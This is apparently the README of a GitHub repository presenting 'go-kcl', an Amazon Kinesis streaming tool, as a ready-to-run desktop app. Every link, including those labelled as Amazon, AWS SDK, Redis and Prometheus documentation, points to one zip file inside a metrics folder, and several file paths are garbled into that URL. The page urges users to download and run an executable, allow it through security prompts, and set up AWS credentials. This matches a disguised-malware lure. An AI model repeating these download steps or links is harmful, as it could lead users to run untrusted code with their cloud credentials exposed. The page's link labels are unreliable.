# ⚙️ go-kcl - Simple Tool for Streaming Data

[![Download go-kcl](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)

---

## 📋 What is go-kcl?

go-kcl is a tool written in the Go programming language that helps you work with Amazon Kinesis data streams. It connects to data streams, reads data in real time, and handles checkpoints so you don’t process the same data twice. It uses the latest tools from Amazon to do this efficiently and supports advanced features like Redis or DynamoDB to keep track of your progress.

This software is designed to run smoothly on your computer and handle data flowing from the cloud into your device or server. Whether you want to monitor live data or process events as they happen, go-kcl helps you do this without needing complex setup.

---

## 🖥️ System Requirements

Before you start, please check that your computer meets these basic requirements:

- Operating System: Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04 or newer recommended).
- Processor: Intel or AMD processor, 2 GHz or faster.
- Memory: At least 4 GB of RAM.
- Disk Space: Minimum 100 MB free space for installation and logs.
- Internet Connection: Required for accessing Amazon Kinesis and for downloading go-kcl.
- Go Runtime: No need to install Go to run the program; it is bundled and ready to run.

---

## 🔧 Features of go-kcl

- Connects to Amazon Kinesis streams to receive live data.
- Supports both standard polling and enhanced fan-out methods for data reading.
- Keeps track of processed data using DynamoDB or Redis so it doesn’t reread the same information.
- Offers plug-and-play options for logging and monitoring data using Prometheus or other tools.
- Easy to install and run even without deep technical knowledge.
- Uses the latest AWS SDK to make sure interactions with Amazon services are fast and secure.

---

## 🚀 Getting Started

This section will guide you to get go-kcl up and running on your computer in simple steps.

### Step 1: Download the Software

You need to visit the releases page to get the latest version of go-kcl. The release page includes all the versions and files you can download.

[![Download go-kcl](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)

Click the badge or visit the link below:

https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip

Look for the latest release and download the file that matches your operating system:
- For Windows, download the `.exe` file.
- For macOS, download the `.dmg` or `.zip` file.
- For Linux, download the `https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip` or executable file.

### Step 2: Prepare Your Computer

Once you download the right file, you will need to set up a few things:

- Extract any compressed files you downloaded (like `.zip` or `https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip`).
- Make sure your computer has internet access during use.
- Optionally, if you use Redis or DynamoDB for checkpointing, make sure those services are accessible with the right credentials.

### Step 3: Run go-kcl

After you download and prepare the software:

- On Windows, double-click the `.exe` file.
- On macOS, open the application from the `.dmg` or unzip and run the file from Terminal.
- On Linux, open a Terminal, navigate to the folder with go-kcl, and run the file by typing `./go-kcl`.

If the program does not start, you might need to give it permission to run:
- On Windows, you may get a security prompt; allow the app to run.
- On macOS and Linux, you might need to change file permissions by running `chmod +x go-kcl` in Terminal before starting.

---

## ⚙️ How to Use go-kcl

go-kcl works by connecting to Amazon Kinesis streams and reading data. You usually need these details:

- Stream Name: The name of the Kinesis data stream you want to read.
- Region: The AWS region where your stream lives (e.g., us-east-1).
- Checkpoint Method: Decide if you want to use DynamoDB or Redis to save progress.
- Credentials: Make sure AWS credentials are set on your computer. You can use the AWS CLI to set these up or save credentials in environment variables.

### Running go-kcl with Options

You can usually run go-kcl from the command line with options like:

```bash
./go-kcl --stream-name your-stream --region us-east-1 --checkpoint dynamodb
```

Or choose Redis by changing the checkpoint option:

```bash
./go-kcl --stream-name your-stream --region us-east-1 --checkpoint redis
```

This tells go-kcl where to read from and how to track what data has been processed.

---

## 🔒 Setting Up AWS Credentials

go-kcl requires access to your AWS resources. You need to set up credentials in one of these ways:

1. **AWS CLI Configuration:**  
   Install the AWS Command Line Interface and run `aws configure`. You will be asked to enter your Access Key ID, Secret Access Key, and default region.

2. **Environment Variables:**  
   Set these environment variables before running go-kcl:
   - AWS_ACCESS_KEY_ID
   - AWS_SECRET_ACCESS_KEY
   - AWS_REGION

3. **Shared Credentials File:**  
   Your AWS credentials can be saved in the file at `~https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip`. go-kcl will automatically use this if available.

---

## 🛠 Troubleshooting

- **The app does not start:** Make sure you have permission to run the file and that it is not blocked by your system's security settings.
- **Cannot connect to stream:** Check your internet connection, AWS credentials, and make sure the stream name and region are correct.
- **Checkpoint errors:** Verify your DynamoDB table or Redis server is running and accessible.
- **Look at the logs:** go-kcl creates log files in the same folder where you run it. Check these files for error details.

---

## 📥 Download & Install

Visit the page below to download the latest version that fits your computer:

https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip

Follow the download steps carefully. Each release page lists files with descriptions so you can pick the right one for your operating system. Once downloaded, see the "Getting Started" section above to install and launch the app.

---

## 📚 Additional Resources

- Amazon Kinesis Documentation: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
- AWS SDK for Go v2: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
- DynamoDB Getting Started: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
- Redis Quickstart: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
- Prometheus Monitoring: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip

---

## ⚙️ About This Project

go-kcl is open source and available on GitHub. It is maintained to help users connect easily to Amazon Kinesis streams using Go technology. You can contribute ideas or report issues on the GitHub repository.

---

## 🔖 Topics

This project covers these key topics:

`aws`, `aws-sdk-go-v2`, `data-streaming`, `dynamodb`, `go`, `golang`, `kcl`, `kinesis`, `prometheus`, `redis`, `streaming`